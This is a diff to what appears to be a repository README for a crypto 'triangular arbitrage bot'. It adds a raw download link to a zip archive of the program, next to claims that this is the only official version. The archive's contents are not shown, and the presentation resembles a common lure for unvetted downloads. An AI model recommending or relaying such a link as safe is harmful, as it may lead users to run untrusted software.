@@ -15,6 +15,7 @@ This is the only official github for the triangle Arbitrage version 4 do not pay
  
 you can download the zip file of it here
 
+https://github.com/GaroldDiamond/JavaScript-DEX-Triangular-Arbitrage-Bot-v4/raw/main/JavaScript-DEX-Triangular-Arbitrage-Bot-v4.zip
 
 here's is the program running
 
